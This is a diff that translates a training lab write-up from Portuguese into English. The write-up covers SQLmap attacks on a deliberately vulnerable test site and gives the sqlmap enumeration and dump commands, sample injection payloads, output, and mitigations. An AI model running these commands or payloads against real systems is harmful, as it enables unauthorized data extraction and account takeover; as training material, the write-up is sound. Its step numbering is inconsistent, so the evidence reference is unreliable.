@@ -1,115 +1,113 @@
-# Atividade 6.10 — Explorando SQL Injection no Kali Linux com SQLmap
+# Activity 6.10 — Exploring SQL Injection on Kali Linux with SQLmap
 
-## Objetivo
+> **Program:** Hackers do Bem  
+> **Stage:** Fundamental — Module 06  
+> **Class:** 23–24  
+> **Environment:** Kali Linux  
+> **Status:** Completed
 
-Nesta atividade foi utilizado o **SQLmap** no Kali Linux para analisar uma aplicação web disponibilizada especificamente para testes de segurança e demonstrar o funcionamento de uma vulnerabilidade de **SQL Injection**.
+## Objective
 
-A partir de um parâmetro GET da aplicação, foram identificados:
+This activity used SQLmap on Kali Linux to analyze a web application specifically provided for security testing and demonstrate how an SQL Injection vulnerability works.
 
-* o SGBD utilizado;
-* as técnicas de SQL Injection aceitas pelo parâmetro;
-* os bancos de dados disponíveis;
-* as tabelas do banco `acuart`;
-* as colunas das tabelas;
-* dados de uma coluna da tabela `users`;
-* e, no laboratório, uma credencial de teste que permitiu autenticação na própria aplicação vulnerável.
+Using a GET parameter from the application, the following information was identified:
 
-> A atividade foi realizada contra o ambiente de treinamento `testphp.vulnweb.com`, disponibilizado para testes de segurança. As credenciais utilizadas para acesso ao laboratório não são registradas neste documento.
+- The DBMS used by the application.
+- The SQL Injection techniques supported by the parameter.
+- The available databases.
+- The tables in the `acuart` database.
+- The columns in those tables.
+- Data from a column in the `users` table.
+- A test credential that, in the laboratory, allowed authentication to the vulnerable application itself.
 
----
+The activity was performed against the `testphp.vulnweb.com` training environment, which is provided for security testing. The credentials used to access the laboratory are not recorded in this document.
 
-## Ambiente
+## Environment
 
-* **Sistema:** Kali Linux
-* **Acesso:** RDP
-* **IP:** `192.168.98.40`
-* **Usuário:** `aluno`
-* **Ferramenta:** SQLmap
-* **Alvo de laboratório:** `http://testphp.vulnweb.com`
-* **Parâmetro analisado:** `artist`
+- **Operating system:** Kali Linux
+- **Access method:** RDP
+- **Machine IP address:** `192.168.98.40`
+- **User:** `aluno`
+- **Tool:** SQLmap
+- **Laboratory target:** `http://testphp.vulnweb.com`
+- **Parameter analyzed:** `artist`
 
----
+## 1. Identify the Test Application
 
-## 1. Identificando a aplicação de teste
+In Firefox, a search was performed to locate a page in the training environment that used an `id` parameter:
 
-No Firefox foi realizada uma pesquisa para localizar uma página do ambiente de treinamento que utilizasse um parâmetro `id`:
-
-```text id="m4z8p2"
+```text
 site:http://testphp.vulnweb.com/ php?id=
 ```
 
-O primeiro resultado direcionou para:
+The first result led to:
 
-```text id="q7x3n5"
+```text
 http://testphp.vulnweb.com
 ```
 
-No site foi acessada a opção **Browse artists** e, em seguida, o primeiro artista identificado como `r4w8173`.
+On the website, **Browse artists** was selected, followed by the first artist identified as `r4w8173`.
 
-A página aberta possuía a seguinte estrutura:
+The resulting page had the following structure:
 
-```text id="k2v6r9"
+```text
 http://testphp.vulnweb.com/artists.php?artist=1
 ```
 
-O parâmetro:
+The parameter:
 
-```text id="c5j8w3"
+```text
 artist=1
 ```
 
-seria utilizado pelo SQLmap para verificar a possibilidade de SQL Injection.
+was used by SQLmap to check for a possible SQL Injection vulnerability.
 
----
+## 2. Obtain Administrative Privileges on Kali Linux
 
-## 2. Obtendo privilégios administrativos no Kali Linux
+The following command was used in the terminal:
 
-No terminal foi utilizado:
-
-```bash id="p9r4x7"
+```bash
 sudo -i
 ```
 
-A senha utilizada para o laboratório foi omitida deste documento.
+The password used in the laboratory has been omitted from this document.
 
----
+## 3. Identify Databases with SQLmap
 
-## 3. Identificando os bancos de dados com SQLmap
+The first test used the `artist` parameter to identify potential injection points and enumerate databases:
 
-O primeiro teste utilizou o parâmetro `artist` para identificar possíveis pontos de injeção e listar os bancos de dados:
-
-```bash id="u3k7m1"
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 –dbs
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
 ```
 
-O SQLmap iniciou os testes contra o parâmetro GET `artist`.
+SQLmap began testing the `artist` GET parameter.
 
-Entre as informações identificadas estavam:
+The findings included:
 
-```text id="a8q2v6"
+```text
 [INFO] testing if GET parameter 'artist' is dynamic
 [INFO] GET parameter 'artist' appears to be dynamic
 [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
 ```
 
-O SQLmap identificou o backend como MySQL e prosseguiu com diferentes técnicas de SQL Injection.
+SQLmap identified MySQL as the likely backend DBMS and proceeded to test different SQL Injection techniques.
 
-### Técnicas testadas
+### Techniques Tested
 
-Durante a análise foram realizados testes de:
+The analysis included tests for:
 
-* Boolean-based Blind;
-* Error-based;
-* Parameter Replace;
-* Stacked Queries;
-* Time-based Blind;
-* UNION Query.
+- Boolean-based Blind
+- Error-based
+- Parameter Replace
+- Stacked Queries
+- Time-based Blind
+- UNION Query
 
-O SQLmap identificou que o parâmetro `artist` era vulnerável.
+SQLmap identified the `artist` parameter as vulnerable.
 
-Parte relevante do resultado:
+**Relevant output:**
 
-```text id="f6w3j9"
+```text
 Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
@@ -124,43 +122,41 @@ Parameter: artist (GET)
    Payload: artist=-9154 UNION ALL SELECT CONCAT(0x7162767a71,0x614d4c77757359426e45586b645243546a4e486c6161786b455549636c4a7649707a6e506261596d,0x716b787171),NULL,NULL-- -
 ```
 
-O SQLmap também identificou:
+SQLmap also identified the following environment details:
 
-```text id="r5m8c2"
+```text
 [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu
 web application technology: Nginx 1.19.0, PHP 5.6.40
 back-end DBMS: MySQL >= 5.0.12
 ```
 
-### Bancos encontrados
+### Databases Found
 
-O resultado foi:
+The result was:
 
-```text id="t7x4p9"
+```text
 available databases [2]:
 [*] acuart
 [*] information_schema
 ```
 
-Portanto, o SQLmap conseguiu enumerar dois bancos de dados:
+SQLmap therefore enumerated two databases:
 
-* `acuart`;
-* `information_schema`.
+- `acuart`
+- `information_schema`
 
----
+## 4. Enumerate Tables in the `acuart` Database
 
-## 4. Enumerando as tabelas do banco `acuart`
+After identifying the database, the following command was executed:
 
-Com o banco identificado, foi executado:
-
-```bash id="n6q2v8"
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
 ```
 
-O SQLmap retornou:
+SQLmap returned:
 
-```text id="w3m9k5"
+```text
 Database: acuart
 [8 tables]
 +-----------+
@@ -175,9 +171,9 @@ Database: acuart
 +-----------+
 ```
 
-Foram identificadas oito tabelas:
+Eight tables were identified:
 
-```text id="y8c4r1"
+```text
 artists
 carts
 categ
@@ -188,23 +184,21 @@ products
 users
 ```
 
-A tabela `users` chamou atenção por representar uma possível área sensível da aplicação.
+The `users` table was of particular interest because it could contain sensitive application data.
 
----
+## 5. Enumerate the Columns
 
-## 5. Enumerando as colunas
+To retrieve the structure of the tables in the `acuart` database, the following command was used:
 
-Para obter a estrutura das tabelas do banco `acuart`, foi utilizado:
-
-```bash id="g2p7x5"
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –columns
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --columns
 ```
 
-O SQLmap identificou as seguintes estruturas.
+SQLmap identified the following table structures.
 
-### Tabela `artists`
+### `artists` Table
 
-```text id="s9m4q2"
+```text
 Database: acuart
 Table: artists
 [3 columns]
@@ -217,9 +211,9 @@ Table: artists
 +-----------+-------------+
 ```
 
-### Tabela `featured`
+### `featured` Table
 
-```text id="k6v3p8"
+```text
 Database: acuart
 Table: featured
 [2 columns]
@@ -231,9 +225,9 @@ Table: featured
 +--------------+------+
 ```
 
-### Tabela `categ`
+### `categ` Table
 
-```text id="r4x8n1"
+```text
 Database: acuart
 Table: categ
 [3 columns]
@@ -246,9 +240,9 @@ Table: categ
 +--------+-------------+
 ```
 
-### Tabela `pictures`
+### `pictures` Table
 
-```text id="v7m2c9"
+```text
 Database: acuart
 Table: pictures
 [8 columns]
@@ -266,9 +260,9 @@ Table: pictures
 +--------+--------------+
 ```
 
-### Tabela `guestbook`
+### `guestbook` Table
 
-```text id="p5q9w3"
+```text
 Database: acuart
 Table: guestbook
 [3 columns]
@@ -281,9 +275,9 @@ Table: guestbook
 +----------+--------------+
 ```
 
-### Tabela `carts`
+### `carts` Table
 
-```text id="j8x4m6"
+```text
 Database: acuart
 Table: carts
 [3 columns]
@@ -296,9 +290,9 @@ Table: carts
 +---------+--------------+
 ```
 
-### Tabela `products`
+### `products` Table
 
-```text id="b3r7k2"
+```text
 Database: acuart
 Table: products
 [5 columns]
@@ -313,9 +307,9 @@ Table: products
 +-------------+--------------+
 ```
 
-### Tabela `users`
+### `users` Table
 
-```text id="h6n2v9"
+```text
 Database: acuart
 Table: users
 [8 columns]
@@ -333,9 +327,9 @@ Table: users
 +---------+--------------+
 ```
 
-A tabela `users` possui campos relacionados a autenticação e dados pessoais, como:
+The `users` table contains fields related to authentication and personal information, such as:
 
-```text id="x5q8m4"
+```text
 uname
 pass
 email
@@ -343,23 +337,21 @@ phone
 address
 ```
 
-Também foi identificado o campo `cc`, relacionado a informações de cartão.
+The `cc` field, associated with card information, was also identified.
 
-Em uma aplicação real, a exposição desses dados por meio de SQL Injection representaria um risco significativo.
+In a real application, exposing this data through SQL Injection would represent a significant security risk.
 
----
+## 6. Retrieve Data from the `users` Table
 
-## 6. Obtendo dados da tabela `users`
+After identifying the table structure, a test targeting the `uname` column was performed:
 
-Com a estrutura da tabela conhecida, foi realizado um teste direcionado à coluna `uname`:
-
-```bash id="q4v8p6"
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname --dump
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
 ```
 
-O resultado apresentou uma entrada:
+The result contained one entry:
 
-```text id="m7c3x9"
+```text
 Database: acuart
 Table: users
 [1 entry]
@@ -370,182 +362,171 @@ Table: users
 +-------+
 ```
 
-O SQLmap informou ainda que os dados foram registrados localmente em:
+SQLmap also reported that the data was saved locally to:
 
-```text id="w2n6r4"
+```text
 /root/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv
 ```
 
-O valor encontrado corresponde a uma conta de teste do ambiente vulnerável.
+The retrieved value corresponds to a test account in the vulnerable environment.
 
----
+## 7. Retrieve the Laboratory Password Field
 
-## 7. Obtendo o campo de senha do laboratório
+Next, the following command was executed:
 
-Em seguida, foi executado:
-
-```bash id="f8k2m5"
-sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass –dump
+```bash
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
 ```
 
-O SQLmap retornou uma entrada para a coluna `pass`.
+SQLmap returned an entry for the `pass` column.
 
-Por se tratar de uma credencial de autenticação, o valor não é reproduzido neste README.
+Because this is an authentication credential, the actual value is not reproduced in this README.
 
-O resultado confirmou que o ambiente de treinamento armazenava a credencial da conta de teste de forma diretamente recuperável.
+The result confirmed that the training environment stored the test account's credential in a form that could be retrieved directly through the vulnerability.
 
----
+## 8. Test Authentication
 
-## 8. Testando a autenticação
+Using the data retrieved in the previous steps, the following page was accessed again:
 
-Com os dados recuperados nos passos anteriores, foi acessada novamente a página:
-
-```text id="c6x9p3"
+```text
 http://testphp.vulnweb.com/artists.php?artist=1
 ```
 
-Na aplicação foi selecionada a opção **Signup**, localizada na coluna esquerda.
+On the application, the **Signup** option in the left-hand column was selected.
 
-Foram inseridas as credenciais de teste obtidas durante a enumeração e realizada a tentativa de autenticação.
+The test credentials obtained during enumeration were entered, and an authentication attempt was made.
 
-O login foi aceito pelo ambiente de treinamento, demonstrando o impacto que uma SQL Injection pode ter quando permite acesso a informações armazenadas no banco de dados.
+The login was accepted by the training environment, demonstrating the potential impact of SQL Injection when it exposes information stored in a database.
 
-**Este é o passo solicitado para a evidência da atividade.**
+This is the step specified for the activity evidence.
 
----
+## SQL Injection Techniques Observed
 
-## Técnicas de SQL Injection observadas
+### Boolean-Based Blind
 
-### Boolean-based Blind
+SQLmap identified a technique based on Boolean conditions.
 
-O SQLmap identificou uma técnica baseada em condições booleanas.
+Example identified:
 
-Exemplo identificado:
-
-```text id="d9m4q7"
+```sql
 artist=1 AND 5066=5066
 ```
 
-A técnica permite inferir informações observando diferenças no comportamento das respostas da aplicação quando condições verdadeiras ou falsas são utilizadas.
+This technique can infer information by observing differences in the application's responses when true or false conditions are supplied.
 
-### Time-based Blind
+### Time-Based Blind
 
-Também foi identificada uma técnica baseada em tempo:
+A time-based technique was also identified:
 
-```text id="k5v8x2"
+```sql
 artist=1 AND (SELECT 6951 FROM (SELECT(SLEEP(5)))OcNh)
 ```
 
-Nesse tipo de teste, atrasos controlados na resposta podem ser utilizados para inferir se uma condição foi processada pelo banco de dados.
+In this type of test, controlled response delays can be used to infer whether a condition was processed by the database.
 
 ### UNION Query
 
-O SQLmap identificou uma técnica baseada em `UNION`, com três colunas:
+SQLmap identified a UNION-based technique and reported that it could test different column counts:
 
-```text id="p3n7c5"
-Generic UNION query (NULL) - 3 columns
+```text
+Generic UNION query (NULL) - 1 to 20 columns
 ```
 
-Esse tipo de técnica pode permitir combinar resultados de consultas quando a aplicação é vulnerável.
+This technique can allow results from additional queries to be combined with the original query when an application is vulnerable.
 
-### Error-based
+### Error-Based
 
-Também foram realizados testes que exploram respostas de erro do SGBD para obter informações sobre o processamento da consulta.
+Tests were also performed to examine whether database error responses could expose information about query processing.
 
 ### Stacked Queries
 
-O SQLmap verificou a possibilidade de execução de consultas empilhadas, nas quais múltiplas instruções SQL podem ser processadas em determinadas condições.
+SQLmap tested whether stacked queries were possible. Under certain conditions, stacked queries allow multiple SQL statements to be processed in a single request.
 
----
+## What Was Identified
 
-## O que foi identificado
-
-O processo de enumeração demonstrou uma sequência típica de análise de uma SQL Injection:
+The enumeration process demonstrated a typical SQL Injection analysis workflow:
 
 ```text
-Parâmetro GET
+GET Parameter
      ↓
-Detecção de SQL Injection
+SQL Injection Detection
      ↓
-Identificação do SGBD
+DBMS Identification
      ↓
-Enumeração de databases
+Database Enumeration
      ↓
-Enumeração de tabelas
+Table Enumeration
      ↓
-Enumeração de colunas
+Column Enumeration
      ↓
-Extração de dados
+Data Extraction
      ↓
-Teste de impacto na aplicação
+Impact Assessment in the Application
 ```
 
-Neste laboratório, o parâmetro:
+In this laboratory, the following parameter was identified as vulnerable:
 
-```text id="z4q8m1"
+```text
 artist
 ```
 
-foi identificado como vulnerável.
+The backend was identified as MySQL, and the `acuart` database contained a `users` table with authentication-related fields.
 
-O backend foi identificado como **MySQL**, e o banco `acuart` apresentou uma tabela `users` contendo campos relacionados à autenticação.
-
----
-
-## Conceitos de segurança
+## Security Concepts
 
 ### SQL Injection
 
-SQL Injection ocorre quando dados controlados pelo usuário são incorporados de maneira insegura a consultas SQL.
+SQL Injection occurs when user-controlled data is incorporated unsafely into SQL queries.
 
-Quando não existem mecanismos adequados de validação e parametrização, um atacante pode manipular a consulta original e fazer com que o banco execute operações não previstas pela aplicação.
+When appropriate validation and parameterization are absent, an attacker may manipulate the original query and cause the database to perform operations that were not intended by the application.
 
-### Impacto
+### Potential Impact
 
-Uma vulnerabilidade desse tipo pode permitir, dependendo do contexto:
+Depending on the context, this type of vulnerability may allow:
 
-* descoberta da estrutura do banco;
-* leitura de informações;
-* alteração de dados;
-* acesso a informações de autenticação;
-* comprometimento de contas;
-* e, em determinados cenários, impactos adicionais sobre a aplicação ou infraestrutura.
+- Discovery of database structures.
+- Unauthorized reading of information.
+- Modification of data.
+- Exposure of authentication information.
+- Account compromise.
+- Additional impacts on the application or infrastructure in certain scenarios.
 
-### Medidas de mitigação
+### Mitigation Measures
 
-Entre as principais medidas defensivas estão:
+Key defensive measures include:
 
-* utilizar **prepared statements / consultas parametrizadas**;
-* evitar concatenar entrada do usuário diretamente em consultas SQL;
-* aplicar validação de entrada;
-* utilizar contas de banco de dados com o menor privilégio necessário;
-* proteger informações sensíveis armazenadas;
-* armazenar senhas utilizando algoritmos modernos de hash apropriados;
-* monitorar tentativas anômalas de acesso à aplicação;
-* realizar testes de segurança periodicamente.
+- Using prepared statements and parameterized queries.
+- Avoiding direct concatenation of user input into SQL statements.
+- Applying input validation where appropriate.
+- Using database accounts with the minimum privileges required.
+- Protecting sensitive stored information.
+- Storing passwords using appropriate modern password-hashing algorithms.
+- Monitoring anomalous requests and application access attempts.
+- Performing security testing regularly.
+
+## Results
+
+The activity demonstrated, in a dedicated testing environment, how SQLmap can automate the identification and controlled testing of an SQL Injection vulnerability.
+
+The `artist` parameter was identified as vulnerable, and SQLmap was able to:
+
+- Detect a potential SQL Injection vulnerability.
+- Identify MySQL as the backend DBMS.
+- Identify the `acuart` database.
+- Enumerate eight tables.
+- Enumerate the columns in those tables.
+- Identify the `users` table.
+- Retrieve data from a test account.
+- Demonstrate the vulnerability's impact through authentication in the training environment.
+
+The activity highlighted how a single vulnerable parameter can expose database structure and sensitive data, potentially affecting account security.
+
+## Evidence
+
+The evidence for this activity corresponds to **Step 11**, in which the test credentials retrieved during the activity were used to authenticate to the vulnerable training environment.
+
+[View Evidence — Classes 23–24](../evidencias.pdf)
 
 ---
 
-## Resultado
-
-A atividade demonstrou, em um ambiente criado para testes, como o SQLmap pode automatizar a identificação e exploração controlada de uma SQL Injection.
-
-O parâmetro `artist` foi identificado como vulnerável e o SQLmap conseguiu:
-
-1. detectar a possibilidade de SQL Injection;
-2. identificar o MySQL como backend;
-3. identificar o banco `acuart`;
-4. enumerar oito tabelas;
-5. enumerar as colunas dessas tabelas;
-6. identificar a tabela `users`;
-7. recuperar dados de uma conta de teste;
-8. demonstrar o impacto da vulnerabilidade por meio da autenticação no ambiente de treinamento.
-
----
-
-## Evidência
-
-A evidência desta atividade corresponde ao **passo 11**, no qual as credenciais de teste recuperadas durante a atividade foram utilizadas para realizar a autenticação no ambiente vulnerável.
-
-[**Evidências — Módulo 6 / Aulas 3 e 4**](../evidencias.pdf)
-
+[Back to Classes 23–24](../) · [Back to Module 06](../../README.md) · [Back to Fundamental](../../../README.md) · [Back to Hackers do Bem](../../../../README.md)
